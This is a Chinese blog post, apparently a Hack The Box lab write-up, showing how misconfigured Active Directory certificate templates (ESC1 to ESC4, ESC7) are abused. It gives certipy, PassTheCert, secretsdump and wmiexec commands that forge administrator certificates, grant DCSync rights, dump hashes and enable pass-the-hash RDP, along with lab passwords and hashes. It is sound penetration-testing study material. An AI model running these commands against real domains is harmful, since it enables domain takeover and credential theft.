@@ -1,0 +1,342 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>ADCS漏洞汇总 | dandeny's blog</title><meta name="author" content="dandeny"><meta name="copyright" content="dandeny"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="ESC7测试机器：HTB-Manager 前提条件：域内安装CA证书服务，域内用户权限 使用certipy来枚举证书漏洞，发现存在ESC7漏洞且Raven用户有管理CA权限。 1certipy find -u &amp;#x27;raven@manager.htb&amp;#x27; -p &amp;#x27;R4v3nBe5tD3veloP3r!123&amp;#x27; -dc-ip 10.10.11.236 -target">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ADCS漏洞汇总">
+<meta property="og:url" content="http://example.com/2023/12/29/ADCS%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/index.html">
+<meta property="og:site_name" content="dandeny&#39;s blog">
+<meta property="og:description" content="ESC7测试机器：HTB-Manager 前提条件：域内安装CA证书服务，域内用户权限 使用certipy来枚举证书漏洞，发现存在ESC7漏洞且Raven用户有管理CA权限。 1certipy find -u &amp;#x27;raven@manager.htb&amp;#x27; -p &amp;#x27;R4v3nBe5tD3veloP3r!123&amp;#x27; -dc-ip 10.10.11.236 -target">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/bg/3wkO7fuQpgda6vz.png">
+<meta property="article:published_time" content="2023-12-29T07:55:53.000Z">
+<meta property="article:modified_time" content="2023-12-29T08:09:03.830Z">
+<meta property="article:author" content="dandeny">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/bg/3wkO7fuQpgda6vz.png"><link rel="shortcut icon" href="/images/bg/941d9457d1adf41dd8022e5edbc284a1.jpg"><link rel="canonical" href="http://example.com/2023/12/29/ADCS%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":500},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'ADCS漏洞汇总',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-12-29 16:09:03'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/images/bg/941d9457d1adf41dd8022e5edbc284a1.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">9</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/images/bg/3wkO7fuQpgda6vz.png')"><nav id="nav"><span id="blog-info"><a href="/" title="dandeny's blog"><span class="site-name">dandeny's blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">ADCS漏洞汇总</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-12-29T07:55:53.000Z" title="发表于 2023-12-29 15:55:53">2023-12-29</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-12-29T08:09:03.830Z" title="更新于 2023-12-29 16:09:03">2023-12-29</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>13分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="ADCS漏洞汇总"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="ESC7"><a href="#ESC7" class="headerlink" title="ESC7"></a>ESC7</h2><p>测试机器：HTB-Manager</p>
+<p>前提条件：域内安装CA证书服务，域内用户权限</p>
+<p>使用certipy来枚举证书漏洞，发现存在ESC7漏洞且Raven用户有管理CA权限。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy find -u <span class="string">&#x27;raven@manager.htb&#x27;</span> -p <span class="string">&#x27;R4v3nBe5tD3veloP3r!123&#x27;</span> -dc-ip 10.10.11.236 -target 10.10.11.236 -vulnerable -stdout</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/content/Snipaste_2023-12-15_16-23-10.png" alt="Alt text"></p>
+<p>通过Raven用户添加管理证书权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy ca -u <span class="string">&#x27;raven@manager.htb&#x27;</span> -p <span class="string">&#x27;R4v3nBe5tD3veloP3r!123&#x27;</span> -ca manager-DC01-CA -dc-ip 10.10.11.236 -target 10.10.11.236 -add-officer raven</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/content/Snipaste_2023-12-15_16-23-24.png" alt="Alt text"></p>
+<p>启动SubCA证书模板，添加时默认启用</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#列出证书模板</span></span><br><span class="line">certipy ca -u <span class="string">&#x27;raven@manager.htb&#x27;</span> -p <span class="string">&#x27;R4v3nBe5tD3veloP3r!123&#x27;</span> -ca manager-DC01-CA -dc-ip 10.10.11.236 -target 10.10.11.236 -list-templates</span><br><span class="line"><span class="comment">#如果SubCA模板没启动，可以使用下面命令进行启动</span></span><br><span class="line">certipy ca -u <span class="string">&#x27;raven@manager.htb&#x27;</span> -p <span class="string">&#x27;R4v3nBe5tD3veloP3r!123&#x27;</span> -ca manager-DC01-CA -dc-ip 10.10.11.236 -target 10.10.11.236 -enable-template SubCA</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/content/Snipaste_2023-12-15_16-23-51.png" alt="Alt text"></p>
+<p>请求基于SubCA模板的证书，该请求会被拒绝，记下请求的ID即可</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy req -u <span class="string">&#x27;raven@manager.htb&#x27;</span> -p <span class="string">&#x27;R4v3nBe5tD3veloP3r!123&#x27;</span> -ca manager-DC01-CA -dc-ip 10.10.11.236 -target 10.10.11.236 -template SubCa -upn administrator@manager.htb</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/content/Snipaste_2023-12-15_16-24-43.png" alt="Alt text"></p>
+<p>管理证书，发出失败的请求ID（这里的机器每10分钟证书会被重置，所以会出现失败的情况。重新添加管理证书权限即可）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy req -u <span class="string">&#x27;raven@manager.htb&#x27;</span> -p <span class="string">&#x27;R4v3nBe5tD3veloP3r!123&#x27;</span> -ca manager-DC01-CA -dc-ip 10.10.11.236 -target 10.10.11.236 -issue-request 13</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/content/Snipaste_2023-12-15_16-25-02.png" alt="Alt text"></p>
+<p><img src="/images/content/Snipaste_2023-12-15_16-25-20.png" alt="Alt text"></p>
+<p>重新检索已颁发的证书</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy req -u <span class="string">&#x27;raven@manager.htb&#x27;</span> -p <span class="string">&#x27;R4v3nBe5tD3veloP3r!123&#x27;</span> -ca manager-DC01-CA -dc-ip 10.10.11.236 -target 10.10.11.236 -retrieve 13</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/content/Snipaste_2023-12-15_16-25-29.png" alt="Alt text"></p>
+<h3 id="KRB-AP-ERR-SKEW"><a href="#KRB-AP-ERR-SKEW" class="headerlink" title="KRB_AP_ERR_SKEW"></a>KRB_AP_ERR_SKEW</h3><p>可能会出现与服务器时间差距较大的情况从而无法获取证书<code>Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)</code>，可以先关闭自动校准时间然后同步域控服务器时间即可</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#关闭自动校准时间</span></span><br><span class="line">sudo timedatectl set-ntp <span class="literal">false</span></span><br><span class="line"><span class="comment">#同步域控服务器时间</span></span><br><span class="line">sudo ntpdate -u 10.10.11.236</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/content/Snipaste_2023-12-15_16-57-14.png" alt="Alt text"></p>
+<p>认证已颁发的证书</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy auth -pfx administrator.pfx -dc-ip 10.10.11.236</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/content/Snipaste_2023-12-15_16-56-33.png" alt="Alt text"></p>
+<h2 id="ESC1"><a href="#ESC1" class="headerlink" title="ESC1"></a>ESC1</h2><p>测试机器：HTB-Escape</p>
+<p>前提条件：域内安装CA证书服务，域内用户权限</p>
+<p>使用certipy枚举证书漏洞</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy find -u <span class="string">&#x27;ryan.cooper&#x27;</span> -p <span class="string">&#x27;NuclearMosquito3&#x27;</span> -dc-ip 10.10.11.202 -target 10.10.11.202 -vulnerable -stdout</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/content/Snipaste_2023-12-19_14-17-08.png" alt="Alt text"></p>
+<p>针对ESC1请求管理员证书，其中<code>UserAuthentication</code>为之前枚举的<code>Template Name</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy req -u <span class="string">&#x27;ryan.cooper&#x27;</span> -p <span class="string">&#x27;NuclearMosquito3&#x27;</span> -ca sequel-DC-CA -dc-ip 10.10.11.202 -target 10.10.11.202 -template UserAuthentication -upn administrator@SEQUEL.HTB</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/content/Snipaste_2023-12-19_14-50-46.png" alt="Alt text"></p>
+<p>根据证书获取管理员hash</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy auth -pfx administrator.pfx -dc-ip 10.10.11.202</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/content/Snipaste_2023-12-20_17-32-36.png" alt="Alt text"></p>
+<h3 id="KDC-ERR-PADATA-TYPE-NOSUPP"><a href="#KDC-ERR-PADATA-TYPE-NOSUPP" class="headerlink" title="KDC_ERR_PADATA_TYPE_NOSUPP"></a>KDC_ERR_PADATA_TYPE_NOSUPP</h3><p><img src="/images/content/Snipaste_2023-12-21_15-18-01.png" alt="Alt text"></p>
+<p>这台机器正常情况下请求TGT时会出现<code>KDC_ERR_PADATA_TYPE_NOSUPP</code>，表示不支持这种类型的证书认证。AD默认支持两种协议的证书认证<code>Kerberos PKINIT</code>和<code>Schannel</code>，这里就是不支持<code>Kerberos PKINIT</code>认证，所以可以使用<code>Schannel</code>认证，<code>Schannel</code>认证走的ldaps协议。可以使用<a target="_blank" rel="noopener" href="https://github.com/AlmondOffSec/PassTheCert">PassTheCert</a>来实现。</p>
+<p>先从administrator.pfx中提取密钥和证书</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">certipy cert -pfx administrator.pfx -nokey -out user.crt</span><br><span class="line">certipy cert -pfx administrator.pfx -nocert -out user.key</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/content/Snipaste_2023-12-21_15-38-14.png" alt="Alt text"></p>
+<p>获取证书所代表的用户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-passthecert -action <span class="built_in">whoami</span> -crt user.crt -key user.key -domain sequel.htb -dc-ip 10.10.11.202</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/content/Snipaste_2023-12-21_15-18-18.png" alt="Alt text"></p>
+<p>创建机器用户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-passthecert -action add_computer -crt user.crt -key user.key -domain sequel.htb -dc-ip 10.10.11.202</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/content/Snipaste_2023-12-21_15-18-36.png" alt="Alt text"></p>
+<p>赋予创建的机器用户<code>DCSync</code>权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-passthecert -action modify_user -crt user.crt -key user.key -domain sequel.htb -dc-ip 10.10.11.202 -target <span class="string">&#x27;DESKTOP-QANJBC9M$&#x27;</span> -elevate</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/content/Snipaste_2023-12-21_15-19-16.png" alt="Alt text"></p>
+<p>获取域内用户hash</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump <span class="string">&#x27;DESKTOP-QANJBC9M$&#x27;</span>:<span class="string">&#x27;cNJJzSqTL2DrIadbop2vwnILzhre8iIc&#x27;</span>@10.10.11.202</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/content/Snipaste_2023-12-21_15-19-30.png" alt="Alt text"></p>
+<h2 id="ESC2-ESC3"><a href="#ESC2-ESC3" class="headerlink" title="ESC2 ESC3"></a>ESC2 ESC3</h2><p>测试机器：HTB-Escape</p>
+<p>前提条件：域内安装CA证书服务，域内用户权限</p>
+<p>ESC2和ESC3的漏洞机器直接在<code>Escape</code>这台机器上构造，在构造ESC2漏洞的时候先构造ESC3漏洞，因为ESC2漏洞环境可以使用ESC1和ESC3漏洞的利用步骤。</p>
+<h3 id="ESC3"><a href="#ESC3" class="headerlink" title="ESC3"></a>ESC3</h3><p>利用之前ESC1拿到的<code>administrator hash</code>先用impacket-wmiexec登录后，修改注册表使机器能用hash登录。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">impacket-wmiexec administrator@10.10.11.202 -hashes <span class="string">&#x27;aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#允许hash登录rdp</span></span><br><span class="line">REG ADD <span class="string">&quot;HKLM\System\CurrentControlSet\Control\Lsa&quot;</span> /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f</span><br><span class="line"></span><br><span class="line"><span class="comment">#开启rdp服务</span></span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br><span class="line"></span><br><span class="line"><span class="comment">#添加防火墙放行策略</span></span><br><span class="line">netsh firewall add portopening protocol = TCP port = 3389 name = rdp</span><br><span class="line"></span><br><span class="line"><span class="comment">#利用xfreerdp登录3389</span></span><br><span class="line">xfreerdp /u:<span class="string">&#x27;administrator&#x27;</span> /pth:<span class="string">&#x27;a52f78e4c751e5f5e17e1e9f3e58f4ee&#x27;</span> /v:10.10.11.202 /cert-ignore -tls-seclevel:2 /size:80%</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/content/Snipaste_2023-12-22_15-26-41.png" alt="Alt text"></p>
+<p>之后就是注册证书模板，这里复制代理注册模板，可以用下面的路径打开</p>
+<p><code>Control Pannel -&gt; Administrative Tools -&gt; Certification Authority -&gt; sequel-DC-CA -&gt; Certificate Templates(Manage) -&gt; Enrollment Agent -&gt; Duplicate Template </code></p>
+<p>复制模板的时候需要修改几个地方，其中在<code>Security</code>中添加<code>Domain Users</code>组，并且勾选<code>Enroll</code>。<code>Subject Name</code>选择<code>Supply in the request</code>。<code>General</code>修改<code>Template display name</code>这里随便修改就行，我修改成ESC33。修改完成后点击OK，然后返回到<code>Administrative Tools</code>颁发刚才创建的模板，具体的路径为：</p>
+<p><code>Control Pannel -&gt; Administrative Tools -&gt; Certification Authority -&gt; sequel-DC-CA -&gt; Certificate Templates(new) -&gt; Certificate Template to Issue</code></p>
+<p><img src="/images/content/Snipaste_2023-12-22_15-21-43.png" alt="Alt text"></p>
+<p>至此环境就搭建完成，使用certipy扫描漏洞</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy find -u <span class="string">&#x27;ryan.cooper&#x27;</span> -p <span class="string">&#x27;NuclearMosquito3&#x27;</span> -dc-ip 10.10.11.202 -target 10.10.11.202 -vulnerable -stdout</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/content/Snipaste_2023-12-22_15-46-26.png" alt="Alt text"></p>
+<p>利用ryan.cooper用户注册ESC33证书</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy req -u <span class="string">&#x27;ryan.cooper&#x27;</span> -p <span class="string">&#x27;NuclearMosquito3&#x27;</span> -ca sequel-DC-CA -dc-ip 10.10.11.202 -target 10.10.11.202 -template ESC33</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/content/Snipaste_2023-12-22_15-52-36.png" alt="Alt text"></p>
+<p>以ryan.cooper用户身份注册到的证书模板ryan.cooper.pfx代理域管administrator注册<code>User</code>证书模板，来获取administrator.pfx证书</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy req -u <span class="string">&#x27;ryan.cooper@SEQUEL.HTB&#x27;</span> -p <span class="string">&#x27;NuclearMosquito3&#x27;</span> -ca sequel-DC-CA -dc-ip 10.10.11.202 -target 10.10.11.202 -template User -on-behalf-of <span class="string">&#x27;SEQUEL\Administrator&#x27;</span> -pfx ryan.cooper.pfx</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/content/Snipaste_2023-12-22_15-52-53.png" alt="Alt text"></p>
+<p>用户administrator.pfx获取管理员hash</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy auth -pfx administrator.pfx -dc-ip 10.10.11.202</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/content/Snipaste_2023-12-22_15-53-01.png" alt="Alt text"></p>
+<h3 id="ESC2"><a href="#ESC2" class="headerlink" title="ESC2"></a>ESC2</h3><p>ESC2的漏洞环境搭建和ESC3的漏洞搭建基本相似，只不过模板换成了<code>Workstation Authentication</code>，并且将<code>Extensions</code>中的<code>Application Policies</code>条目清空。<code>Security</code>中和ESC3一样需要添加<code>Domain Users</code>组并且赋予注册的权限，<code>Subject Name</code>也是选择<code>Supply in the request</code>。</p>
+<p><img src="/images/content/Snipaste_2023-12-22_16-05-02.png" alt="Alt text"></p>
+<p>枚举漏洞</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy find -u <span class="string">&#x27;ryan.cooper&#x27;</span> -p <span class="string">&#x27;NuclearMosquito3&#x27;</span> -dc-ip 10.10.11.202 -target 10.10.11.202 -vulnerable -stdout</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/content/Snipaste_2023-12-22_16-07-14.png" alt="Alt text"></p>
+<p><strong>ESC3的利用方法：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">certipy req -u <span class="string">&#x27;ryan.cooper@SEQUEL.HTB&#x27;</span> -p <span class="string">&#x27;NuclearMosquito3&#x27;</span> -ca sequel-DC-CA -dc-ip 10.10.11.202 -target 10.10.11.202 -template ESC2</span><br><span class="line"></span><br><span class="line">certipy req -u <span class="string">&#x27;ryan.cooper@SEQUEL.HTB&#x27;</span> -p <span class="string">&#x27;NuclearMosquito3&#x27;</span> -ca sequel-DC-CA -dc-ip 10.10.11.202 -target 10.10.11.202 -template User -on-behalf-of <span class="string">&#x27;SEQUEL\Administrator&#x27;</span> -pfx ryan.cooper.pfx</span><br><span class="line"></span><br><span class="line">certipy auth -pfx administrator.pfx -dc-ip 10.10.11.202</span><br></pre></td></tr></table></figure>
+<p><img src="/images/content/Snipaste_2023-12-22_16-12-50.png" alt="Alt text"></p>
+<p><strong>ESC1的利用方法：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">certipy req -u <span class="string">&#x27;ryan.cooper@SEQUEL.HTB&#x27;</span> -p <span class="string">&#x27;NuclearMosquito3&#x27;</span> -ca sequel-DC-CA -dc-ip 10.10.11.202 -target 10.10.11.202 -template ESC2 -upn administrator@SEQUEL.HTB</span><br><span class="line"></span><br><span class="line">certipy auth -pfx administrator.pfx -dc-ip 10.10.11.202</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/content/Snipaste_2023-12-22_16-16-15.png" alt="Alt text"></p>
+<p>两种利用方式除了利用步骤不同，证书的申请人以不一样，ESC1的证书申请人为当前域用户，而ESC3的申请人为Administrator，相对ESC1来说ESC3有一定的隐蔽效果</p>
+<p><img src="/images/content/Snipaste_2023-12-22_16-25-32.png" alt="Alt text"></p>
+<h2 id="ESC4"><a href="#ESC4" class="headerlink" title="ESC4"></a>ESC4</h2><p>测试机器：HTB-Escape</p>
+<p>前提条件：域内安装CA证书服务，域内用户权限</p>
+<p>ESC4的漏洞机器也直接在<code>Escape</code>这台机器上构造。这次只需要复制<code>Workstation Authentication</code>模板，并且在<code>Security</code>添加<code>Domain Users</code>有读写权限即可，其他不做修改。</p>
+<p><img src="/images/content/Snipaste_2023-12-22_16-52-24.png" alt="Alt text"></p>
+<p>枚举漏洞</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy find -u <span class="string">&#x27;ryan.cooper&#x27;</span> -p <span class="string">&#x27;NuclearMosquito3&#x27;</span> -dc-ip 10.10.11.202 -target 10.10.11.202 -vulnerable -stdout</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/content/Snipaste_2023-12-22_16-54-36.png" alt="Alt text"></p>
+<p>ESC4因为对证书模板有写权限，所以可以覆盖模板配置使其容易受到ESC1的攻击，可以使用certipy来覆盖配置，并将原来配置保存便于恢复配置。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy template -u <span class="string">&#x27;ryan.cooper&#x27;</span> -p <span class="string">&#x27;NuclearMosquito3&#x27;</span> -dc-ip 10.10.11.202 -target 10.10.11.202 -template ESC4 -save-old</span><br></pre></td></tr></table></figure>
+<p><img src="/images/content/Snipaste_2023-12-25_11-32-45.png" alt="Alt text"></p>
+<p>这时再去枚举模板漏洞就会发现ESC4模板存在1，2，3，4这几个漏洞</p>
+<p><img src="/images/content/Snipaste_2023-12-25_11-31-28.png" alt="Alt text"></p>
